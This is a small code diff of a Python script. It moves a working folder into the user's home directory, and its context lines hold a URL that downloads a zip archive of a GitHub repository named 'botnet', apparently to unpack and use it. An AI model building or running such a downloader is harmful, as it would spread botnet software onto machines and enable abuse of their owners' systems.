@@ -5,8 +5,10 @@ import shutil
 import sys
 import urllib.request
 import zipfile
+from pathlib import Path
 
-working_dir = "temp_folder"
+home_dir = Path.home()
+working_dir = f"{home_dir}/temp_folder"
 github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 
 
 def main():
